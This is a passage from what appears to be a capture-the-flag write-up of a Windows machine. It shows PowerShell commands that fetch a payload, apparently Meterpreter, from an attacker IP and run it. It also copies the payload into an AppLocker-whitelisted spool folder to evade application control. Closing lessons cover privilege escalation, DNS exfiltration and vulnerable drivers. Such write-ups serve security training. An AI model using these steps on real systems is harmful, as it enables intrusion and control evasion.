<pre tabindex="0" aria-label="powershell code or terminal block 51"><code class="language-powershell" data-language="powershell"># Upload as "met" (no extension)
wget 10.10.16.84/met.exe -outfile met

# Execute directly
Start-Process -Filepath C:\programdata\met -Wait -NoNewWindow
</code></pre>
<h3 id="whitelisted-directory">Whitelisted Directory</h3>
<p><code>C:\Windows\System32\spool\drivers\color</code> is world-writable and AppLocker-whitelisted:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 52"><code class="language-powershell" data-language="powershell">copy met C:\windows\system32\spool\drivers\color\met.exe
# Works! Execute from there.
</code></pre>

<h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
<h3 id="1-read-everything">1. Read Everything</h3>
<p>The hint about the "members site" was on the homepage. In real engagements, developers leak information in comments, error messages, and "helpful" text.</p>
<h3 id="2-test-assumptions">2. Test Assumptions</h3>
<p><code>xp_cmdshell</code> was "blocked" by a WAF, not disabled. PowerShell was "blocked" for 64-bit, but 32-bit worked. What seems impossible often just needs a different angle.</p>
<h3 id="3-understand-windows-defenses">3. Understand Windows Defenses</h3>
<ul>
<li><strong>AppLocker:</strong> Blocks by path, publisher, or hash. Often has gaps (32-bit apps, whitelisted directories, built-in binaries like <code>msbuild</code>).</li>
<li><strong>Windows Firewall:</strong> Can block outbound traffic. verify allowed ports before launching reverse shells.</li>
<li><strong>UAC/Token Privileges:</strong> <code>SeImpersonatePrivilege</code> opens doors to JuicyPotato and similar exploits.</li>
</ul>
<h3 id="4-kernel-drivers-system">4. Kernel Drivers = SYSTEM</h3>
<p>Any non-Microsoft kernel driver is worth investigating. Known-vulnerable drivers (Capcom, DBUtil, etc.) are reliable privilege escalation vectors.</p>
<h3 id="5-blind-injection-techniques">5. Blind Injection Techniques</h3>
<p>When you can't see output:</p>
<ul>
<li>Use <code>ping</code> + <code>tcpdump</code> for network confirmation</li>
<li>Use <code>nslookup</code> + <code>tcpdump</code> for DNS exfiltration</li>
<li>Use <code>WAITFOR DELAY</code> for time-based confirmation</li>
<li>Write output to files you can read via other means</li>
</ul>
<h3 id="6-scheduled-tasks-are-gold">6. Scheduled Tasks Are Gold</h3>
<p>Any script that runs automatically and is writable by low-privilege users is a privilege escalation vector. Check:</p>
<pre tabindex="0" aria-label="powershell code or terminal block 53"><code class="language-powershell" data-language="powershell">Get-ScheduledTask | Get-ScheduledTaskInfo
schtasks /query /fo LIST /v
</code></pre>
<h3 id="7-reverse-engineering-basics">7. Reverse Engineering Basics</h3>
<p>You don't need Ghidra for simple challenges. Look for:</p>
<ul>
<li>Error strings to find relevant functions</li>
<li>XOR loops (common in CTFs)</li>
<li>Addition/subtraction obfuscation</li>
<li>Hardcoded buffers</li>
</ul>
